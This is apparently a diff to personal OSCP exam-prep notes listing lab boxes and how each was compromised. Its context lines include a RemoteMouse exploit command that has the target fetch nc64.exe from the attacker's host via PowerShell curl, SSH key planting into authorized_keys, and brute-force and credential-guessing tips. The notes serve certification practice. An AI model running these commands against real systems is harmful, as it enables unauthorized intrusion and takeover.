@@ -11,6 +11,13 @@
 1. Scanning ports showed 1978, exploit = `python3 RemoteMouse-3.008-Exploit.py --target-ip {{RHOST}} -v --cmd 'powershell -c "curl http://{{LHOST}}/nc64.exe -o C:/Windows/Temp/nc.exe"'` 
 2. Check for unusual programs installed, eg 'PuTTY', and where they can store creds. 
 
+#### OSCP B, Box 1 => SMTP 
+1. When nothing to hack on TCP, try scanning UDP. Run smtpwalk, try usernames as passwords. 
+
+#### OSCP B, Box 3 => Freeswitch 
+1. When too many things on TCP, try checking weird services' versions. Exploit = 47799. 
+
+
 ---- 
 
 
@@ -33,7 +40,6 @@ Try = https://github.com/rix4uni/FTPBruteForce.git
 2. Delete crap at start of key file till 'ssh-rsa' then `scp -O -i id_rsa authorized_keys max@{{RHOST}}:/home/max/.ssh/authorized_keys` 
 
 ---- 
-
 
 #### LazySysAdmin => SMB 
 1. Check smb 'share$' to get user & mysql creds. 
